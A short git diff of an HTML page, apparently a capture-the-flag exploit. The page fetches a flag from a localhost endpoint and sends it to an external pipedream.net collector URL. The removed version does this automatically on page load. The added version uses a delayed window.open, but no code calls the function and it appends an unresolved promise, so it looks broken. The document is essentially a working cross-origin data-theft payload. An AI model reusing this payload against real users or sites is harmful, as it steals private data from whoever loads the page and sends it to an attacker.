@@ -1,15 +1,17 @@
+<!DOCTYPE html>
 <html>
-  <head>
-    <title>Prova</title>
-    <script>
-      function test(){
-        fetch("http://localhost/get_flag.php").then(r => {
-        if (r.ok) {
-          return r.json();
-        }
-      }).then(d => fetch("https://enahomwjmoi9k.x.pipedream.net/" + d).then(r2 => console.log(r2)));
-      }
-    </script>
-  </head>
-  <body onload="test();"></body>
+<head>
+<title>HTML, CSS and JavaScript demo</title>
+</head>
+<body>
+<!-- Start your code here -->
+<script>
+    function prova(){
+        fetch("https://localhost/get_flag.php").then(d => {
+            if(d.ok) setTimeout(function(){ window.open("https://enahomwjmoi9k.x.pipedream.net/" + d.json()); }, 2500);
+        });
+    }
+</script>
+<!-- End your code here -->
+</body>
 </html>
